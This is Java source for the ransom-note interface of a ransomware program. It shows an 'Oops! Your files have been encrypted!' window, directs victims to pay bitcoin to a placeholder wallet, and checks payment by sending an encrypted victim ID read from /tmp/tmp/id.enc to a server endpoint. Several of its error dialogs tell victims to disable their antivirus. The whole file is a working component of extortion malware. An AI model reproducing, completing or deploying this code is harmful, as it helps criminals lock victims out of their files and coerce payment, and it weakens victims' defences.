import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.ConnectException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.util.Base64;

public class launcher{

    public static void main(String[] args){
        launcher launch = new launcher();
        launch.prepareGUI();
    }

    private void prepareGUI(){
        JPanel panel = new JPanel();
        panel.setBackground(Color.RED);

        //mainframe details
        JFrame frame = new JFrame("Ransomware Decryption Tool");
        frame.setDefaultCloseOperation(frame.EXIT_ON_CLOSE);
        frame.setSize(1980, 1080);
        frame.getContentPane().setBackground(Color.RED);

        JPanel mainPanel = new JPanel(new GridLayout(2,1));


        JLabel label = new JLabel("Oops! Your files have been encrypted!",SwingConstants.CENTER);
        label.setFont(new Font("Calibri",Font.BOLD,25));
        label.setForeground(Color.BLACK);

        //menu
        JMenuBar mb = new JMenuBar();
        JMenu m1 = new JMenu("Options");
        JMenu m2 = new JMenu("Help");
        mb.add(m1);
        mb.add(m2);

        //To be implemented in future release
        JMenuItem m11 = new JMenuItem("Load Key");
        JMenuItem m12 = new JMenuItem("Close");
        JMenuItem m21 = new JMenuItem("How to Get my Files Back?");
        m1.add(m11);
        m1.add(m12);
        m2.add(m21);
        m12.addActionListener(new CloseListener());
        m21.addActionListener(new HelpListener());

        JButton button1 = new JButton("Decrypt!");
        JButton button2 = new JButton("Check Payment");
        button1.setFont(new Font("Serif", Font.ITALIC, 30));
        button2.setFont(new Font("Serif", Font.ITALIC, 30));
        button1.addActionListener(new DecryptListener());
        button2.addActionListener(new checkPayment());

        mainPanel.add(mb);
        mainPanel.add(label);
        mainPanel.setBackground(Color.RED);
        //Add them to panel
        panel.add(button1);
        panel.add(button2);
        frame.add(BorderLayout.NORTH,mainPanel);
        frame.add(BorderLayout.SOUTH, panel);
        frame.setVisible(true);
    }
}

class checkPayment implements ActionListener{
    @Override
    public void actionPerformed(ActionEvent e){
        try{
            File f = new File("/tmp/tmp/id.enc");
            byte[] encid = Files.readAllBytes(f.toPath());
            String encoded_id = Base64.getEncoder().encodeToString(encid);
            String modifiedid = encoded_id.replace('+','-');
            URL obj = new URL("http://127.0.0.1/check_payment.php?id="+modifiedid);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setRequestMethod("GET");
            con.addRequestProperty("Victim", "Yes");
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
	    	String inputLine;
            StringBuilder response = new StringBuilder();
            while((inputLine = in.readLine()) != null){
                response.append(inputLine);
            }
            in.close();
            String ans  =response.toString();
            JFrame frame3 = new JFrame("Status!");
            frame3.setDefaultCloseOperation(frame3.DISPOSE_ON_CLOSE);
            JLabel label2 = new JLabel("<html><h4>"+ans+"</h4></html>",SwingConstants.CENTER);
            frame3.setSize(500,200);
            JButton button4 = new JButton("Close");
            JPanel panel2 = new JPanel();
            panel2.add(button4);
            ActionListener closeFrame3 = e13 -> frame3.dispose();
            button4.addActionListener(closeFrame3);
            frame3.add(BorderLayout.CENTER,label2);
            frame3.add(BorderLayout.SOUTH,panel2);
            frame3.setVisible(true);
        }
        catch (ConnectException er){
            JFrame frame = new JFrame("Server down!");
            frame.setDefaultCloseOperation(frame.DISPOSE_ON_CLOSE);
            JLabel label = new JLabel("<html>Server is down! Try again later!</html>",SwingConstants.CENTER);
            frame.setSize(500,200);
            JButton button = new JButton("Close");
            JPanel panel = new JPanel();
            panel.add(button);
            ActionListener closeFrame = e12 -> frame.dispose();
            button.addActionListener(closeFrame);
            frame.add(BorderLayout.SOUTH,panel);
            frame.add(BorderLayout.CENTER,label);
            frame.setVisible(true);
        }
        catch (Exception ex){
            JFrame frame = new JFrame("Unknown Error!");
            frame.setDefaultCloseOperation(frame.DISPOSE_ON_CLOSE);
            JLabel label = new JLabel("<html>If you see this message, then you are in trouble.<br>Disable Antivirus and try again<br>If nothing works click on Contact Us</html>",SwingConstants.CENTER);
            frame.setSize(500,200);
            JButton button = new JButton("Close");
            JPanel panel = new JPanel();
            panel.add(button);
            ActionListener closeFrame = e1 -> frame.dispose();
            button.addActionListener(closeFrame);
            frame.add(BorderLayout.CENTER,label);
            frame.setVisible(true);
        }
    }
}

//Event handler for "Decrypt" Button
class DecryptListener implements ActionListener{
    @Override
    public void actionPerformed(ActionEvent e) {
        try{
            if(!decrypt.validatePayment()){
                JFrame frame = new JFrame("Decryption Error!");
                frame.setDefaultCloseOperation(frame.DISPOSE_ON_CLOSE);
                JLabel label = new JLabel("<html><h3>You have not paid the ransom yet!</h3></html>",SwingConstants.CENTER);
                frame.setSize(500,200);
                JButton button = new JButton("Close");
                JPanel panel = new JPanel();
                panel.add(button);
                ActionListener closeFrame = e1 -> frame.dispose();
                button.addActionListener(closeFrame);
                frame.add(BorderLayout.CENTER,label);
                frame.add(BorderLayout.SOUTH,panel);
                frame.setVisible(true);
            }
            else {
                JFrame frame3 = new JFrame("Decryption Done!");
                frame3.getContentPane().setBackground(Color.GREEN);
                frame3.setDefaultCloseOperation(frame3.DISPOSE_ON_CLOSE);
                JLabel label3 = new JLabel("File have been decrypted!", SwingConstants.CENTER);
                label3.setForeground(Color.RED);
                frame3.setSize(500, 200);
                JButton button4 = new JButton("close");
                JPanel panel = new JPanel();
                panel.setBackground(Color.GREEN);
                panel.add(button4);
                ActionListener closeFrame3 = e1 -> frame3.dispose();
                button4.addActionListener(closeFrame3);
                frame3.add(BorderLayout.CENTER, label3);
                frame3.add(BorderLayout.SOUTH, panel);
                frame3.setVisible(true);
            }
        }
        catch (Exception err){
            JFrame frame = new JFrame("Decryption Error!");
            frame.setDefaultCloseOperation(frame.DISPOSE_ON_CLOSE);
            JLabel label = new JLabel("<html><h3>Error has been detected during Decryption! Run program again and remember to Disable antivirus.If same issue keeps on coming, then you are doomed!</h3></html>",SwingConstants.CENTER);
            frame.setSize(500,200);
            JButton button = new JButton("Close");
            JPanel panel = new JPanel();
            panel.add(button);
            ActionListener closeFrame = e1 -> frame.dispose();
            button.addActionListener(closeFrame);
            frame.add(BorderLayout.CENTER,label);
            frame.add(BorderLayout.SOUTH,panel);
            frame.setVisible(true);
        }
    }
}
//Event handler for "Close" button
class CloseListener implements ActionListener{
    @Override
    public void actionPerformed(ActionEvent e){
        System.exit(0);
    }
}
//Event handler for "How to get my files back?" button
class HelpListener implements ActionListener{
    @Override
    public void actionPerformed(ActionEvent e){
        JFrame frame2 = new JFrame("Get files back!");
        frame2.setDefaultCloseOperation(frame2.DISPOSE_ON_CLOSE);
        JLabel label2 = new JLabel("<html><ul>" + 
                                    "<li>Pay the ransom to bitcoin_wallet_address</li>"+
                                    "<li>Once payed you just need to press decrypt button</li>"+
                                    "<li>Private key will be automatically loaded</li>"+
                                    "</ul></html>");
        frame2.setSize(500,200);
        JButton button3 = new JButton("Close");
        JPanel panel = new JPanel();
        panel.add(button3);
        ActionListener closeFrame2 = e1 -> frame2.dispose();
        button3.addActionListener(closeFrame2);
        frame2.add(BorderLayout.CENTER,label2);
        frame2.add(BorderLayout.SOUTH,panel);
        frame2.setVisible(true);
    }
}